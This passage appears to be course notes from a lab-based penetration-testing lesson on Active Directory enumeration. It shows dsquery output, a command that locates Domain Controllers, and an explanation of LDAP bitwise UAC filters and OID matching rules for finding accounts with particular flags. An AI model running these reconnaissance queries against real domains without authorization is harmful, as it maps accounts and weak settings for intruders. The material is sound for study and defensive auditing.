  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080
```

The below search filter looks for all Domain Controllers in the current domain, limiting to five results.

**Searching for Domain Controllers**
```
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

 sAMAccountName
 ACADEMY-EA-DC01$
```

### LDAP Filtering Explained

LDAP query strings like `userAccountControl:1.2.840.113556.1.4.803:=8192` work with multiple tools including AD PowerShell and ldapsearch. Here's the breakdown:

**`userAccountControl:1.2.840.113556.1.4.803:`**  
Targets User Account Control (UAC) attributes for an object. This portion uses Object Identifiers (OIDs) that can include three different values for AD searches (explained below).

**`=8192`**  
Represents the decimal bitmask to match in the search. This decimal corresponds to a UAC Attribute flag determining if specific attributes are set (e.g., `password is not required` or `account is locked`). These values can combine to create multiple bit entries.

Below is a quick list of potential values.

<img width="1093" height="791" alt="image" src="https://github.com/user-attachments/assets/d2dca2b5-7437-45cb-992c-10a5fcbaebed" />

**OID Match Strings**

OIDs are rules matching bit values with attributes in LDAP and AD. Three main matching rules exist:

**1. `1.2.840.113556.1.4.803`**  
Bit value must match completely to meet search requirements. Ideal for matching a single attribute.

**2. `1.2.840.113556.1.4.804`**  
Results show any attribute match if any bit in the chain matches. Works for objects with multiple attributes set.

**3. `1.2.840.113556.1.4.1941`**  
Matches filters applying to an object's Distinguished Name, searching through all ownership and membership entries.

**Logical Operators**

Combine search values using `&` (and), `|` (or), and `!` (not) operators:

**Example - AND operator:**  
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`  
Matches users with UAC bit value 64 (Password Can't Change).

**Multiple criteria:**  
`(&(1)(2)(3))` - Combines three conditions

**Example - NOT operator:**  
`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`  
Matches users WITHOUT Password Can't Change attribute.

LDAP queries provide extensive search capabilities for AD objects (users, groups, etc.).




